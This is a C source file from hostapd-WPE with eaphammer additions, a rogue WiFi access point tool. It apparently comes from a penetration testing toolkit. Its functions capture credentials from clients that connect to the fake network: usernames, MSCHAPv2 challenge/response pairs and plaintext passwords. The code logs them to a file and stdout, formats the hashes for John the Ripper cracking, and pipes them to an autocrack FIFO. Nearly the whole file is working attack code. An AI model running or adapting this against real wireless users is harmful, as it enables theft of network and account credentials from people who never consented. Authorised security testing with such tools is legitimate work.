/*
    wpe.c - 
        brad.antoniewicz@foundstone.com
        Implements WPE (Wireless Pwnage Edition) functionality within 
        hostapd.

        WPE functionality focuses on targeting connecting users. At 
        it's core it implements credential logging (originally 
        implemented in FreeRADIUS-WPE), but also includes other patches
        for other client attacks that have been modified to some extend.

            FreeRADIUS-WPE: https://github.com/brad-anton/freeradius-wpe
*/

#include <time.h>
#include <openssl/ssl.h>
#include "includes.h"
#include "common.h"
#include "wpe/wpe.h"
#include "utils/wpa_debug.h"

#define wpe_logfile_default_location "./hostapd-wpe.log"
#define eaphammer_fifo_default_location "./eaphammer-fifo.node" // eaphammer


#define MSCHAPV2_CHAL_HASH_LEN 8
#define MSCHAPV2_CHAL_LEN 16 
#define MSCHAPV2_RESP_LEN 24

struct wpe_config wpe_conf = {
    .wpe_logfile = wpe_logfile_default_location,
    .wpe_logfile_fp = NULL,
	.eaphammer_fifo = eaphammer_fifo_default_location, // eaphammer
	.eaphammer_fifo_fp = NULL, // eaphammer
	.eaphammer_use_autocrack = 0, // eaphammer
    .wpe_enable_return_success = 0,
};

void wpe_log_file_and_stdout(char const *fmt, ...) {

    if ( wpe_conf.wpe_logfile_fp == NULL ) {
        wpe_conf.wpe_logfile_fp = fopen(wpe_conf.wpe_logfile, "a");
        if ( wpe_conf.wpe_logfile_fp == NULL ) 
            printf("WPE: Cannot file log file");
    }

    va_list ap;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);

    va_start(ap, fmt);
    if ( wpe_conf.wpe_logfile_fp != NULL )
        vfprintf(wpe_conf.wpe_logfile_fp, fmt, ap);
    va_end(ap);
}

// begin eaphammer fifo
void eaphammer_write_fifo(const u8 *username,
						size_t username_len,
						const u8 *challenge,
						size_t challenge_len,
						const u8 *response,
						size_t response_len) {

	int i;

	//mkfifo(wpe_conf.eaphammer_fifo, 0666);
	wpe_conf.eaphammer_fifo_fp = fopen(wpe_conf.eaphammer_fifo, "a");

	// write username to fifo
	if ( wpe_conf.eaphammer_fifo_fp != NULL ) {
		for(i = 0; i < username_len - 1; ++i) {
			fprintf(wpe_conf.eaphammer_fifo_fp, "%c", username[i]);
		}
		fprintf(wpe_conf.eaphammer_fifo_fp, "%c|", username[i]);
	}

	// write challenge to fifo
	if ( wpe_conf.eaphammer_fifo_fp != NULL ) {
		for(i = 0; i < challenge_len - 1; ++i) {
			fprintf(wpe_conf.eaphammer_fifo_fp, "%02x:", challenge[i]);
		}
		fprintf(wpe_conf.eaphammer_fifo_fp, "%02x|", challenge[i]);
	}

	// write response to fifo
	if ( wpe_conf.eaphammer_fifo_fp != NULL ) {
		for(i = 0; i < response_len - 1; ++i) {
			fprintf(wpe_conf.eaphammer_fifo_fp, "%02x:", response[i]);
		}
		fprintf(wpe_conf.eaphammer_fifo_fp, "%02x\n", response[i]);
	}
	
	fclose(wpe_conf.eaphammer_fifo_fp);
}
// end eaphammer fifo

void wpe_log_chalresp(char *type, const u8 *username, size_t username_len, const u8 *challenge, size_t challenge_len, const u8 *response, size_t response_len) {
    time_t nowtime;
    int x; 

    nowtime = time(NULL);

    wpe_log_file_and_stdout("\n\n%s: %s", type, ctime(&nowtime));
    wpe_log_file_and_stdout("\t username:\t");
    for (x=0; x<username_len; x++) {
        wpe_log_file_and_stdout("%c",username[x]);
	}
    wpe_log_file_and_stdout("\n");

    wpe_log_file_and_stdout("\t challenge:\t");
    for (x=0; x<challenge_len - 1; x++) {
        wpe_log_file_and_stdout("%02x:",challenge[x]);
	}
    wpe_log_file_and_stdout("%02x\n",challenge[x]);

    wpe_log_file_and_stdout("\t response:\t");
    for (x=0; x<response_len - 1; x++) {
        wpe_log_file_and_stdout("%02x:",response[x]);
	}
    wpe_log_file_and_stdout("%02x\n",response[x]);

	// begin eaphammer
	if ( wpe_conf.eaphammer_use_autocrack != 0 ) {

		eaphammer_write_fifo(username,
							username_len,
							challenge,
							challenge_len,
							response,
							response_len); 
	}
	// end eaphammer

    if (strncmp(type, "mschapv2", 8) == 0 || strncmp(type, "eap-ttls/mschapv2", 17) == 0) {
        wpe_log_file_and_stdout("\t jtr NETNTLM:\t");
        for (x=0; x<username_len; x++)
            wpe_log_file_and_stdout("%c",username[x]);
        wpe_log_file_and_stdout(":$NETNTLM$");

        for (x=0; x<challenge_len; x++)
            wpe_log_file_and_stdout("%02x",challenge[x]);
        wpe_log_file_and_stdout("$");
        for (x=0; x<response_len; x++)
            wpe_log_file_and_stdout("%02x",response[x]);
        wpe_log_file_and_stdout("\n");
    }
}

void wpe_log_basic(char *type, const u8 *username, size_t username_len, const u8 *password, size_t password_len)  {
    time_t nowtime;
    int x;

    nowtime = time(NULL);

    wpe_log_file_and_stdout("\n\n%s: %s",type, ctime(&nowtime));
    wpe_log_file_and_stdout("\t username:\t");
    for (x=0; x<username_len; x++)
        wpe_log_file_and_stdout("%c",username[x]);
    wpe_log_file_and_stdout("\n");

    wpe_log_file_and_stdout("\t password:\t");
    for (x=0; x<password_len; x++)
        wpe_log_file_and_stdout("%c",password[x]);
    wpe_log_file_and_stdout("\n");
}

/*
    Taken from asleap, who took from nmap, who took from tcpdump :) 
*/
void wpe_hexdump(unsigned char *bp, unsigned int length)
{

    /* stolen from tcpdump, then kludged extensively */

    static const char asciify[] =
        "................................ !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~.................................................................................................................................";

    const unsigned short *sp;
    const unsigned char *ap;
    unsigned int i, j;
    int nshorts, nshorts2;
    int padding;

    wpe_log_file_and_stdout("\n\t");
    padding = 0;
    sp = (unsigned short *)bp;
    ap = (unsigned char *)bp;
    nshorts = (unsigned int)length / sizeof(unsigned short);
    nshorts2 = (unsigned int)length / sizeof(unsigned short);
    i = 0;
    j = 0;
    while (1) {
        while (--nshorts >= 0) {
            wpe_log_file_and_stdout(" %04x", ntohs(*sp));
            sp++;
            if ((++i % 8) == 0)
                break;
        }
        if (nshorts < 0) {
            if ((length & 1) && (((i - 1) % 8) != 0)) {
                wpe_log_file_and_stdout(" %02x  ", *(unsigned char *)sp);
                padding++;
            }
            nshorts = (8 - (nshorts2 - nshorts));
            while (--nshorts >= 0) {
                wpe_log_file_and_stdout("     ");
            }
            if (!padding)
                wpe_log_file_and_stdout("     ");
        }
        wpe_log_file_and_stdout("  ");

        while (--nshorts2 >= 0) {
            wpe_log_file_and_stdout("%c%c", asciify[*ap], asciify[*(ap + 1)]);
            ap += 2;
            if ((++j % 8) == 0) {
                wpe_log_file_and_stdout("\n\t");
                break;
            }
        }
        if (nshorts2 < 0) {
            if ((length & 1) && (((j - 1) % 8) != 0)) {
                wpe_log_file_and_stdout("%c", asciify[*ap]);
            }
            break;
        }
    }
    if ((length & 1) && (((i - 1) % 8) == 0)) {
        wpe_log_file_and_stdout(" %02x", *(unsigned char *)sp);
        wpe_log_file_and_stdout("                                       %c",
               asciify[*ap]);
    }
    wpe_log_file_and_stdout("\n");
}